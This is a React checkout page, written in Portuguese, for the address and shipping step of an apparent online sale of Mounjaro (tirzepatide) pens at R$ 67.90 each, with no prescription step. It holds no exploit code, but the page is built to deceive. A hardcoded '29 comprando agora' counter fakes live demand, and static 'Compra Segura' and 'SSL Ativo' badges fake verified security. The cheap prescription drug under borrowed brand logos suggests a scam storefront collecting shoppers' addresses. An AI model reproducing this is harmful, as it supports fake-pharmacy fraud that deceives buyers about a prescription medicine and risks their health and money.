import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronLeft, Minus, Plus, Lock, Users, ShieldCheck, Loader2, Truck } from "lucide-react";
import { Input } from "@/components/ui/input";
 import { useTrackingService } from "@/hooks/useTrackingService";
import foto1 from "@/assets/mounjaro/foto1.png";
import fullLogo from "@/assets/frete/full-logo.jpeg";
import jadlogLogo from "@/assets/frete/jadlog-logo.jpeg";
import correiosLogo from "@/assets/frete/correios-logo.jpeg";
import slimHealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const PRECO_UNITARIO = 67.90;

const EnderecoPage = () => {
  const navigate = useNavigate();
  
   // Capture tracking
   useTrackingService();
   
  // Recuperar dados da página anterior
  const [quantidade, setQuantidade] = useState(() => {
    const dadosPessoais = JSON.parse(localStorage.getItem('dadosPessoais') || '{}');
    return dadosPessoais.quantidade || 1;
  });

  // Campos de endereço
  const [cep, setCep] = useState("");
  const [rua, setRua] = useState("");
  const [numero, setNumero] = useState("");
  const [complemento, setComplemento] = useState("");
  const [bairro, setBairro] = useState("");
  const [cidade, setCidade] = useState("");
  const [uf, setUf] = useState("");
  const [buscandoCep, setBuscandoCep] = useState(false);
  const [freteSelecionado, setFreteSelecionado] = useState<string | null>(null);

  const opcoesFrete = [
    { id: 'full', nome: 'Frete Grátis', prazo: 'Entrega em 10 a 12 dias', valor: 0, logo: fullLogo },
    { id: 'jadlog', nome: 'JADLOG', prazo: 'Entrega em até 5 dias úteis', valor: 15.90, logo: jadlogLogo },
    { id: 'sedex', nome: 'SEDEX 12', prazo: 'Entrega de 12h a 24h', valor: 29.90, logo: correiosLogo }
  ];

  const subtotal = PRECO_UNITARIO * quantidade;
  const freteAtual = opcoesFrete.find(f => f.id === freteSelecionado);
  const valorFrete = freteAtual?.valor || 0;
  const total = subtotal + valorFrete;

  const formatPrice = (price: number) => {
    return price.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  // Buscar endereço na API ViaCEP
  const buscarEndereco = async (cepLimpo: string) => {
    if (cepLimpo.length === 8) {
      setBuscandoCep(true);
      try {
        const response = await fetch(`https://viacep.com.br/ws/${cepLimpo}/json/`);
        const data = await response.json();
        if (!data.erro) {
          setRua(data.logradouro || "");
          setBairro(data.bairro || "");
          setCidade(data.localidade || "");
          setUf(data.uf || "");
        }
      } catch (error) {
        console.error("Erro ao buscar CEP:", error);
      } finally {
        setBuscandoCep(false);
      }
    }
  };

  // Máscara de CEP: 00000-000
  const handleCepChange = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 8);
    let formatted = digits;
    if (digits.length > 5) {
      formatted = digits.slice(0, 5) + '-' + digits.slice(5);
    }
    setCep(formatted);
    
    // Buscar endereço quando CEP completo
    if (digits.length === 8) {
      buscarEndereco(digits);
    }
  };

  const handleQuantityChange = (delta: number) => {
    setQuantidade((prev: number) => {
      const newQtd = Math.max(1, prev + delta);
      // Atualizar localStorage
      const dadosPessoais = JSON.parse(localStorage.getItem('dadosPessoais') || '{}');
      dadosPessoais.quantidade = newQtd;
      localStorage.setItem('dadosPessoais', JSON.stringify(dadosPessoais));
      return newQtd;
    });
  };

  // Validação do formulário
  const isFormValid = 
    cep.length === 9 && 
    rua.trim() !== "" && 
    numero.trim() !== "" && 
    bairro.trim() !== "" && 
    cidade.trim() !== "" && 
    uf.length === 2 &&
    freteSelecionado !== null;

  const handleContinuar = () => {
    if (isFormValid) {
      // Salvar endereço no localStorage
      localStorage.setItem('endereco', JSON.stringify({
        cep, rua, numero, complemento, bairro, cidade, uf
      }));
      // Salvar frete no localStorage
      localStorage.setItem('frete', JSON.stringify({
        tipo: freteSelecionado,
        nome: freteAtual?.nome,
        prazo: freteAtual?.prazo,
        valor: valorFrete
      }));
      // Navegar para página de confirmação
      navigate("/confirmacao");
    }
  };

  return (
    <div className="min-h-screen bg-slate-100 text-slate-900 flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white border-b">
        <div className="max-w-screen-sm mx-auto px-4">
          <div className="h-14 flex items-center gap-3">
            <button onClick={() => navigate(-1)} className="p-1">
              <ChevronLeft className="w-6 h-6 text-slate-700" />
            </button>
            <h1 className="text-lg font-semibold text-slate-900 flex-1">Endereço</h1>
            
            {/* Logos */}
            <div className="flex items-center gap-1 opacity-70">
              <img src={slimHealthLogo} alt="SlimHealth" className="h-7 w-auto" />
              <span className="text-slate-400 text-xs">+</span>
              <img src={cimedLogo} alt="CIMED" className="h-5 w-auto" />
            </div>
          </div>
        </div>
        {/* Progress Bar - 75% */}
        <div className="h-1 bg-slate-200">
          <div className="h-full w-3/4 bg-rose-500" />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-screen-sm mx-auto w-full pb-32">
        {/* Product Card */}
        <section className="bg-white mx-3 mt-3 rounded-xl p-3 shadow-sm">
          <div className="flex gap-3">
            {/* Product Image */}
            <div className="w-20 h-20 shrink-0 rounded-lg overflow-hidden bg-slate-100">
              <img src={foto1} alt="Mounjaro" className="w-full h-full object-contain" />
            </div>

            {/* Product Info */}
            <div className="flex-1 min-w-0">
              <h2 className="text-sm font-medium text-slate-900 line-clamp-2">
                Mounjaro 5 mg – Tirzepatida (caneta...
              </h2>
              <div className="mt-1 text-lg font-bold text-emerald-600">
                R$ {formatPrice(subtotal)}
              </div>
            </div>

            {/* Quantity Control */}
            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={() => handleQuantityChange(-1)}
                className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200 active:scale-95 transition"
              >
                <Minus className="w-4 h-4" />
              </button>
              <span className="w-6 text-center font-semibold text-slate-900">{quantidade}</span>
              <button
                onClick={() => handleQuantityChange(1)}
                className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200 active:scale-95 transition"
              >
                <Plus className="w-4 h-4" />
              </button>
            </div>
          </div>

          {/* Urgency Text */}
          <div className="mt-3 flex items-center gap-1.5 text-emerald-600 text-sm">
            <Users className="w-4 h-4" />
            <span className="font-medium">29 comprando agora</span>
          </div>
        </section>

        {/* Form Section */}
        <section className="bg-white mx-3 mt-3 rounded-xl p-4 shadow-sm">
          {/* Protected Data Badge */}
          <div className="flex items-center gap-2 text-slate-500 text-sm mb-4">
            <Lock className="w-4 h-4" />
            <span>Dados protegidos</span>
          </div>

          {/* Form Fields */}
          <div className="space-y-4">
            {/* CEP */}
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                CEP
              </label>
              <div className="relative">
                <Input
                  type="text"
                  placeholder="00000-000"
                  value={cep}
                  onChange={(e) => handleCepChange(e.target.value)}
                  className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
                />
                {buscandoCep && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    <Loader2 className="w-5 h-5 text-slate-400 animate-spin" />
                  </div>
                )}
              </div>
            </div>

            {/* Rua */}
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                Rua
              </label>
              <Input
                type="text"
                placeholder="Nome da rua"
                value={rua}
                onChange={(e) => setRua(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>

            {/* Número e Complemento */}
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">
                  Número
                </label>
                <Input
                  type="text"
                  placeholder="Nº"
                  value={numero}
                  onChange={(e) => setNumero(e.target.value)}
                  className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">
                  Complemento
                </label>
                <Input
                  type="text"
                  placeholder="Opcional"
                  value={complemento}
                  onChange={(e) => setComplemento(e.target.value)}
                  className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
                />
              </div>
            </div>

            {/* Bairro */}
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-1.5">
                Bairro
              </label>
              <Input
                type="text"
                placeholder="Bairro"
                value={bairro}
                onChange={(e) => setBairro(e.target.value)}
                className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
              />
            </div>

            {/* Cidade e UF */}
            <div className="grid grid-cols-[1fr_80px] gap-3">
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">
                  Cidade
                </label>
                <Input
                  type="text"
                  placeholder="Cidade"
                  value={cidade}
                  onChange={(e) => setCidade(e.target.value)}
                  className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1.5">
                  UF
                </label>
                <Input
                  type="text"
                  placeholder="UF"
                  value={uf}
                  onChange={(e) => setUf(e.target.value.toUpperCase().slice(0, 2))}
                  className="h-12 bg-slate-50 border-slate-200 rounded-xl text-slate-900 placeholder:text-slate-400"
                />
              </div>
            </div>
          </div>
        </section>

        {/* Shipping Options Section */}
        <section className="bg-white mx-3 mt-3 rounded-xl p-4 shadow-sm">
          {/* Header */}
          <div className="flex items-center gap-2 text-slate-700 text-sm mb-3">
            <Truck className="w-4 h-4" />
            <span>Escolha uma forma de entrega:</span>
          </div>

          {/* Opções de frete */}
          <div className="space-y-2">
            {opcoesFrete.map((opcao) => (
              <div
                key={opcao.id}
                onClick={() => setFreteSelecionado(opcao.id)}
                className={`flex items-center gap-3 p-3 rounded-xl border cursor-pointer transition ${
                  freteSelecionado === opcao.id
                    ? 'border-rose-500 bg-rose-50'
                    : 'border-slate-200 bg-white hover:border-slate-300'
                }`}
              >
                {/* Radio button */}
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 ${
                  freteSelecionado === opcao.id
                    ? 'border-rose-500'
                    : 'border-slate-300'
                }`}>
                  {freteSelecionado === opcao.id && (
                    <div className="w-2.5 h-2.5 rounded-full bg-rose-500" />
                  )}
                </div>

                {/* Logo */}
                <img src={opcao.logo} alt={opcao.nome} className="h-6 w-auto object-contain shrink-0" />

                {/* Info */}
                <div className="flex-1 min-w-0">
                  <div className="font-medium text-slate-900 text-sm">{opcao.nome}</div>
                  <div className="text-xs text-slate-500">{opcao.prazo}</div>
                </div>

                {/* Preço */}
                <div className={`font-semibold text-sm shrink-0 ${
                  opcao.valor === 0 ? 'text-emerald-600' : 'text-slate-900'
                }`}>
                  {opcao.valor === 0 ? 'Grátis' : `R$ ${formatPrice(opcao.valor)}`}
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Security Badges */}
      <div className="fixed inset-x-0 bottom-[72px] z-40 bg-white border-t">
        <div className="max-w-screen-sm mx-auto px-4 py-2 flex items-center justify-center gap-4">
          <div className="flex items-center gap-1 text-emerald-600">
            <ShieldCheck className="w-4 h-4" />
            <span className="text-xs">Compra Segura</span>
          </div>
          <div className="flex items-center gap-1 text-emerald-600">
            <Lock className="w-4 h-4" />
            <span className="text-xs">SSL Ativo</span>
          </div>
          <div className="flex items-center gap-1 text-emerald-600">
            <ShieldCheck className="w-4 h-4" />
            <span className="text-xs">Garantia</span>
          </div>
        </div>
      </div>

      {/* Fixed Footer */}
      <div className="fixed inset-x-0 bottom-0 z-50 bg-white border-t shadow-[0_-2px_10px_rgba(0,0,0,0.06)]">
        <div className="max-w-screen-sm mx-auto px-4 py-3 pb-[calc(12px+env(safe-area-inset-bottom))]">
          <div className="flex items-center justify-between gap-4">
            {/* Total à esquerda */}
            <div className="flex flex-col">
              <span className="text-sm text-slate-500">Total</span>
              <span className="text-xl font-bold text-rose-500">R$ {formatPrice(total)}</span>
            </div>
            
            {/* Botão à direita */}
            <button
              onClick={handleContinuar}
              disabled={!isFormValid}
              className={`px-12 h-12 rounded-full font-semibold text-base transition ${
                isFormValid
                  ? 'bg-rose-500 text-white hover:bg-rose-600 active:scale-[0.98]'
                  : 'bg-slate-200 text-slate-400 cursor-not-allowed'
              }`}
            >
              Continuar
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default EnderecoPage;
